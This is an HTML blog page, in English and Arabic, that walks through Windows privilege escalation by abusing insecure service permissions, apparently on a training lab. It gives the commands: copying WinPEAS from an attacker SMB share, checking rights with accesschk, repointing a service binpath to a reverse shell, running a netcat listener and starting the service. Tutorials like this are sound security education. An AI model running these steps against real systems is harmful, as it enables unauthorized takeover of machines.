@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Windows Privilege Escalation - Insecure Service Permissions | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">windows-privesc</a><span class="sep">/</span><span>Windows Privilege Escalation - Insecure Service Permissions</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">windows-privesc</span>
+<span class="post-date">2023-05-10</span>
+</div>
+<h1 class="post-title">Windows Privilege Escalation - Insecure Service Permissions</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will explain the first technique for escalating privileges on a Windows system through Insecure Service Permissions. Sometimes we find services where we can modify the service configuration, including the executable path. This allows us to replace the service's binary path with our own reverse shell. Let us walk through the details as we go through the practical steps.</p>
+<h2>Walkthrough</h2>
+<h3>Step 1: Confirm Low-Privilege Access</h3>
+<p>First, we confirm that we are logged in as a limited user. We are operating as the user <code>user</code>, which has restricted privileges on the system.</p>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/1.png" alt="Step 1" loading="lazy"></figure>
+<h3>Step 2: Transfer and Run WinPEAS</h3>
+<p>Next, we use the WinPEAS tool. This tool is well-known and needs no introduction -- it enumerates the system to find potential privilege escalation vectors through services and other misconfigurations.</p>
+<p>First, we transfer the script to the compromised system via an SMB server. We use a Python-based SMB server tool that you can find on GitHub:</p>
+<p><a href="https://github.com/SecureAuthCorp/impacket">SMB Server - GitHub</a></p>
+<p>After downloading the tool, it requires two inputs:</p>
+<ul>
+<li><strong>shareName</strong>: you can use any folder name you choose</li>
+<li><strong>sharePath</strong>: the path to the folder containing the script you want to transfer to the compromised system</li>
+</ul>
+<p>Set up the SMB server and then run the following command on the compromised system to download WinPEAS (replace the IP with your Kali machine's IP):</p>
+<pre><code>copy \\&lt;attacker_ip&gt;\&lt;shareName&gt;\winPEASx64.exe C:\PrivEsc\winPEASx64.exe
+</code></pre>
+<p>Then run the script:</p>
+<pre><code>C:\PrivEsc\winPEASx64.exe
+</code></pre>
+<p>We can see that WinPEAS reports that we can modify a service's configuration.</p>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/10.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 3: Check Start/Stop Permissions</h3>
+<p>Does this mean we should immediately start exploiting? Of course not -- we are still missing something. We need to check whether we have permission to start and stop the service, because if we cannot start or stop the service, we cannot exploit it.</p>
+<p>We use the accesschk tool to determine whether we can start and stop the service. You can download accesschk from the Sysinternals suite:</p>
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk - Sysinternals</a></p>
+<p>Upload accesschk to the compromised system and run the following command:</p>
+<pre><code>accesschk.exe /accepteula -ucqv daclsvc
+</code></pre>
+<p>We can see that we have permission to start and stop the service.</p>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/2.png" alt="Step 3" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/3.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 4: Query Service Configuration</h3>
+<p>Now we run the following command to display detailed information about the service, including the <code>BINARY_PATH_NAME</code>:</p>
+<pre><code>sc qc daclsvc
+</code></pre>
+<p>This shows us the current executable path that the service runs. We are going to change this path to point to our reverse shell.</p>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/4.png" alt="Step 5" loading="lazy"></figure>
+<h3>Step 5: Modify the Service Binary Path</h3>
+<p>We change the <code>BINARY_PATH_NAME</code> to point to our reverse shell using the following command:</p>
+<pre><code>sc config daclsvc binpath=&quot;C:\PrivEsc\reverse.exe&quot;
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/5.png" alt="Step 6" loading="lazy"></figure>
+<h3>Step 6: Check the Service State</h3>
+<p>Let us check whether the service is currently running or stopped:</p>
+<pre><code>sc query daclsvc
+</code></pre>
+<p>We can see that the service state is <code>STOPPED</code>, so all we need to do is start it. When the service starts, it will execute our reverse shell that we placed in the <code>BINARY_PATH_NAME</code>.</p>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/6.png" alt="Step 7" loading="lazy"></figure>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/7.png" alt="Step 8" loading="lazy"></figure>
+<h3>Step 7: Set Up a Listener</h3>
+<p>Before starting the service, we set up a netcat listener on the port specified in our reverse shell payload (in this case, port 50):</p>
+<pre><code class="language-bash">nc -lvp 50
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/8.png" alt="Step 9" loading="lazy"></figure>
+<h3>Step 8: Start the Service</h3>
+<p>Now we start the service using the following command:</p>
+<pre><code>net start daclsvc
+</code></pre>
+<p>When the service starts, it executes the binary at the path we configured, which is our reverse shell.</p>
+<h2>Result</h2>
+<p>After starting the service, we receive a reverse shell connection with the highest privileges on the system. We have successfully escalated our privileges by exploiting Insecure Service Permissions.</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/9.png" alt="Step 10" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نشرح اول تكنيك لرفع الصلاحيات على نظام وندوز عن طريق Service-Permissions طبعا بعض الأحيان نلقى Services نقدر انه نعدل ملف ال exe الخاص فيها بحيث انه نحط بدال ملف ال service ملف ال reverse shell الخاص فينا راح نشوف تفاصيل وقت نطبق باذن الله</p>
+<p>الشرح:</p>
+<p>طيب اول شي انا داخل بيوزر محدود الصلاحية اللي هو user</p>
+<p>بعد كذا راح استخدم اداة winpease هذي الاداة غنية عن التعريف راح تسوي enumerate للنظام بحيث تشوف هل في امكانية انه نرفع صلاحيتنا عن طريق services وغيرة</p>
+<p>اول شي راح تنقل السكربت الى النظام المخترق عن طريق smbserver انا استخدمت سكربت بايثون</p>
+<p>هذا هو على موقع قيت اب:</p>
+<p>Smb Server</p>
+<p>طبعا بعد تنزل الملف السكربت راح يطلب منك مدخلين اللي هم</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/1.png" alt="Step 1" loading="lazy"></figure>
+
+<p>shareName sharePath</p>
+<p>الشير نيم تقدر تحط اي اسم مجلد من مخليتك</p>
+<p>الشير باث راح تحط مسار المجلد اللي يحتوي على السكربت اللي راح تنقلة للنظام المخترق</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/10.png" alt="Step 2" loading="lazy"></figure>
+
+<p>ف راح يكون الأمر كالتالي بالنسبة لي:</p>
+<p>بعد كذا راح نروح نكتب هذا الأمر على النظام اللي مخترقينة بحيث يتحمل سكربت winpease على النظام</p>
+<p>طبعا الايبي اللي انا حاطة بالأمر الايبي تبع الكالي حقي عشان محد يتلخبط</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/2.png" alt="Step 3" loading="lazy"></figure>
+
+<p>بعد كذا راح نشغل السكربت</p>
+<p>نلاحظ هنا انه يقولنا نقدر نعدل على السيرفس طيب هل على طول نبدا الاستغلال؟</p>
+<p>طبعا لا ناقصنا شي لازم نشوف هل عندنا صلاحية انه نقدر نسوي start او stop للسيرفس لان لو مانقدر نسوي start او stop للسيرفس ماينفع نستغلها</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/3.png" alt="Step 4" loading="lazy"></figure>
+
+<p>طيب راح استخدم اداة accesschk عشان اعرف هل عندي امكانية انه اسوي start او stop للسيرفس او لا</p>
+<p>هذا الرابط اللي وده يحملها :</p>
+<p>accesschk</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/4.png" alt="Step 5" loading="lazy"></figure>
+
+<p>طيب خلونا نكمل راح ارفع الملف على النظام المخترق وراح انفذ هذ الأمر:</p>
+<p>accesschk.exe /accepteula -uwcqv daclsvc</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/5.png" alt="Step 6" loading="lazy"></figure>
+
+<p>نلاحظ انه عندنا صلاحية انه نسوي start او stop للسيرفس</p>
+<p>اللحين راح ننفذ هذا الأمر عشان يعرض لنا معلومات اكثر عن السيرفس</p>
+<p>sc qc daclsvc</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/6.png" alt="Step 7" loading="lazy"></figure>
+
+<p>اللحين فقط راح نغير ال BINRAY_PATH_NAME الى ال Reverse Shell حقنا</p>
+<p>عن طريق الأمر هذا :</p>
+<p>بعد كذا خلونا نشوف هل السيرفس start ولا stop</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/7.png" alt="Step 8" loading="lazy"></figure>
+
+<p>عن طريق هذا الأمر:</p>
+<p>نلاحظ انه السيرفس stop ف اللي نجتاجه حاليا انه نسوي له start وراح تشغل ملف الريفيرس شل الخاص فينا اللي وضعناه في ال BINRAY_PATH_NAME</p>
+<p>بس قبل نسوي ستارت للسيرفس راح اتنصت على البورت الخاص بالريفيرس شيل حقي اللي هو 50 عن طريق النت كات:</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/8.png" alt="Step 9" loading="lazy"></figure>
+
+<p>nc -lvp 50</p>
+<p>الان راح اسوي ستارت للسيرفس عن طريق هذا الأمر:</p>
+<p>net start daclsvc</p>
+<figure class="article-img"><img src="../assets/images/insecure-service-permissions/9.png" alt="Step 10" loading="lazy"></figure>
+
+<p>وبكذا يكون حصلنا على اعلى صلاحية في النظام</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
